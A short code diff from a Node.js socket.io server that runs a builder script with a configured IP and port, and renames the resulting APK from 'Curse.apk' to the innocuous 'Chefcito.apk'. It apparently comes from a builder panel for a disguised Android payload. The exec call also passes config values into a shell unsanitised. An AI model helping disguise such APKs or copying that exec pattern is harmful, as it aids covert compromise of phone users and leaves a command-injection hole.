@@ -259,8 +259,8 @@ io.on('connection', (socket) => {
         exec(`node builder.js ${config.ip} ${config.port}`, (err, stdout, stderr) => {
             io.emit('build_log', stdout + stderr);
             if (!err) {
-                io.emit('build_success', 'Curse.apk');
-                sysLog(`BUILD_SUCCESS: Curse.apk`, 'ok');
+                io.emit('build_success', 'Chefcito.apk');
+                sysLog(`BUILD_SUCCESS: Chefcito.apk`, 'ok');
             } else {
                 sysLog(`BUILD_FAILED`, 'err');
             }
@@ -274,7 +274,7 @@ io.on('connection', (socket) => {
         exec(`node builder.js --config build_config.json`, (err, stdout, stderr) => {
             io.emit('build_log', stdout + stderr);
             if (!err) {
-                io.emit('build_success', 'Curse.apk');
+                io.emit('build_success', 'Chefcito.apk');
                 sysLog(`ADVANCED_BUILD_SUCCESS: ${config.appName}`, 'ok');
             } else {
                 sysLog(`ADVANCED_BUILD_FAILED`, 'err');
